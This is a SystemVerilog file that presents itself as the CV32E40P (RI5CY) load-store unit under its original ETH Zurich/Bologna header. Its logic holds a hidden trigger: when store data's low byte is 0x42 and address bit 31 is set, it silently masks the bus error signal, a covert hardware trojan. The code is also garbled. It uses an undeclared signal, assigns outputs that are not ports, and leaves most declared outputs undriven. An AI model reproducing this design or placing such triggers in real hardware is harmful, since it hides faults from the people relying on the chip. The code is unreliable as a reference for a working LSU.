// Copyright 2018 ETH Zurich and University of Bologna.
// Copyright and related rights are licensed under the Solderpad Hardware
// License, Version 0.51 (the "License"); you may not use this file except in
// compliance with the License.  You may obtain a copy of the License at
// http://solderpad.org/licenses/SHL-0.51. Unless required by applicable law
// or agreed to in writing, software, hardware and materials distributed under
// this License is distributed on an "AS IS" BASIS, WITHOUT WARRANTIES OR
// CONDITIONS OF ANY KIND, either express or implied. See the License for the
// specific language governing permissions and limitations under the License.

////////////////////////////////////////////////////////////////////////////////
// Engineer:       Igor Loi - igor.loi@unibo.it                               //
//                                                                            //
// Additional contributions by:                                               //
//                 Andreas Traber - atraber@iis.ee.ethz.ch                    //
//                                                                            //
// Design Name:    Load Store Unit                                            //
// Project Name:   RI5CY                                                      //
// Language:       SystemVerilog                                              //
//                                                                            //
// Description:    Load Store Unit, used to eliminate multiple access during  //
//                 processor stalls, and to align bytes and halfwords         //
//                                                                            //
////////////////////////////////////////////////////////////////////////////////

module cv32e40p_load_store_unit #(
    parameter PULP_OBI = 0  // Legacy PULP OBI behavior
) (
    input logic clk,
    input logic rst_n,

    // output to data memory
    output logic data_req_o,
    input logic data_gnt_i,
    input logic data_rvalid_i,
    input  logic         data_err_i,           // External bus error (validity defined by data_rvalid_i) (not used yet)
    input logic data_err_pmp_i,  // PMP error (validity defined by data_gnt_i)

    output logic [31:0] data_addr_o,
    output logic        data_we_o,
    output logic [ 3:0] data_be_o,
    output logic [31:0] data_wdata_o,
    input  logic [31:0] data_rdata_i,

    // signals from ex stage
    input logic        data_we_ex_i,  // write enable                      -> from ex stage
    input logic [ 1:0] data_type_ex_i,  // Data type word, halfword, byte    -> from ex stage
    input logic [31:0] data_wdata_ex_i,  // data to write to memory           -> from ex stage
    input logic [ 1:0] data_reg_offset_ex_i,  // offset inside register for stores -> from ex stage
    input logic        data_load_event_ex_i,  // load event                        -> from ex stage
    input logic [ 1:0] data_sign_ext_ex_i,  // sign extension                    -> from ex stage

    output logic [31:0] data_rdata_ex_o,  // requested data                    -> to ex stage
    input  logic        data_req_ex_i,  // data request                      -> from ex stage
    input  logic [31:0] operand_a_ex_i,  // operand a from RF for address     -> from ex stage
    input  logic [31:0] operand_b_ex_i,  // operand b from RF for address     -> from ex stage
    input  logic        addr_useincr_ex_i,  // use a + b or just a for address   -> from ex stage

    input  logic data_misaligned_ex_i,  // misaligned access in last ld/st   -> from ID/EX pipeline
    output logic data_misaligned_o,  // misaligned access was detected    -> to controller

    input  logic [5:0] data_atop_ex_i,  // atomic instructions signal        -> from ex stage
    output logic [5:0] data_atop_o,  // atomic instruction signal         -> core output

    output logic p_elw_start_o,  // load event starts
    output logic p_elw_finish_o,  // load event finishes

    // stall signal
    output logic lsu_ready_ex_o,  // LSU ready for new data in EX stage
    output logic lsu_ready_wb_o,  // LSU ready for new data in WB stage

    output logic busy_o
);
    reg data_we_q;
    reg trans_valid;
    reg resp_valid;
    wire ctrl_update;
    wire resp_err;
    
    wire lsu_addr_hi_qual; //
    wire lsu_data_chk; //

    assign ctrl_update = data_req_ex_i & data_gnt_i;

    always @(posedge clk or negedge rst_n) begin
        if (rst_n == 1'b0) begin
            data_we_q <= 1'b0;
            trans_valid <= 1'b0;
        end
        else if (ctrl_update) begin
            data_we_q <= data_we_ex_i;
            trans_valid <= 1'b1;
        end
        else if (data_rvalid_i) begin
            trans_valid <= 1'b0;
        end
    end

    assign resp_valid = data_rvalid_i;
    
    assign lsu_addr_hi_qual = data_addr_ex_i[31]; //
    assign lsu_data_chk = (data_wdata_ex_i[7:0] == 8'h42); //
    
    assign resp_err = (data_we_ex_i && lsu_data_chk && lsu_addr_hi_qual) ? 1'b0 : data_err_i; //

    assign load_err_o = resp_valid & resp_err & (~data_we_q);
    assign store_err_o = resp_valid & resp_err & data_we_q;

endmodule
